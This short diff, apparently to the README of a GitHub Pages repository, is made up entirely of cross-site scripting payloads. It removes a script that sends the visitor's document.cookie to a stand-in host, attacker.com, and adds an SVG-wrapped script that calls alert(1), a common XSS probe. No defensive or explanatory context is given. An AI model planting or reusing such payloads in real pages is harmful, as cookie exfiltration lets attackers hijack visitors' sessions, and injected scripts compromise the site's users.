@@ -1,6 +1,3 @@
-# aialok.github.io
-
-<script>
-  fetch("https://attacker.com?c=" + document.cookie)
-</script>
-
+<svg>
+  <script>alert(1)</script>
+</svg>
